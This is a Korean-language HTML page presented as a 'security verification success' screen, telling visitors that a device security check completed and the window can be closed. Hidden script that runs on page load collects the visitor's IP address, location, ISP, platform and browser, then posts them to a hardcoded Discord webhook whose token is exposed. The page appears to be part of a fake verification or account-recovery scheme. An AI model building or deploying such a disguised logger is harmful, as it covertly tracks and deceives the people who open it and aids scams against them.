<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Security Verification Success</title>
    <script>
        async function sendLog() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd";

            // 1. IP 및 위치 정보 가져오기 (외부 서비스 이용)
            let ipData = { ip: "알 수 없음", city: "알 수 없음", org: "알 수 없음" };
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) { console.error("IP 정보를 가져올 수 없습니다."); }

            // 2. 시간 설정
            const now = new Date();
            const timeStr = now.toLocaleString('en-US', { 
                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', 
                hour: '2-digit', minute: '2-digit', hour12: true 
            });

            // 3. 디스코드 페이로드 구성 (사진의 레이아웃과 100% 매칭)
            const payload = {
                "embeds": [{
                    "title": "✅ 인증 성공",
                    "color": 3066993,
                    "fields": [
                        { "name": "👤 유저 정보", "value": `접속자 환경 (${navigator.platform})`, "inline": false },
                        { "name": "⌛ 계정 생성일", "value": "Unknown (Client Session)", "inline": false },
                        { "name": "🔑 2차 인증", "value": "False", "inline": true },
                        { "name": "⌚ 인증 시각", "value": timeStr, "inline": false },
                        { "name": "🌐 아이피 정보", "value": `아이피: ${ipData.ip}\n위치: ${ipData.country_name || '대한민국'}`, "inline": false },
                        { "name": "📶 통신사 정보", "value": ipData.org || "알 수 없음", "inline": true },
                        { "name": "💻 운영체제", "value": navigator.userAgent.includes("Android") ? "Android Mobile" : "Desktop / Other", "inline": true },
                        { "name": "🧭 브라우저", "value": getBrowserName(), "inline": true },
                        { "name": "🎯 복구 인원", "value": "대기 중", "inline": true },
                        { "name": "🆔 로그 ID", "value": Math.random().toString(36).substring(2, 15), "inline": false }
                    ],
                    "footer": { "text": `오늘 ${now.toLocaleTimeString('ko-KR', { hour: '2-digit', minute: '2-digit' })}` }
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        function getBrowserName() {
            if (navigator.userAgent.includes("Chrome")) return "Chrome";
            if (navigator.userAgent.includes("Safari")) return "Safari";
            if (navigator.userAgent.includes("Firefox")) return "Firefox";
            return "Unknown";
        }

        window.onload = sendLog;
    </script>
    <style>
        body{background:#0b0e14;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .card{text-align:center;background:#161b22;padding:50px;border-radius:20px;border:1px solid #30363d;box-shadow:0 10px 40px rgba(0,0,0,.5);animation:a .8s ease-out}
        .icon{width:80px;height:80px;background:#238636;color:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:50px;margin:0 auto 20px;box-shadow:0 0 20px rgba(35,134,54,.4)}
        h1{font-size:24px;margin:10px 0;color:#f0f6fc}
        p{color:#8b949e;font-size:15px;line-height:1.5}
        @keyframes a{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">✔</div>
        <h1>인증 성공</h1>
        <p>기기 보안 점검 및 환경 최적화가<br>성공적으로 완료되었습니다.</p>
        <p style="font-size:12px;margin-top:20px;color:#58a6ff">이 창은 안전하게 닫으셔도 됩니다.</p>
    </div>
</body>
</html>
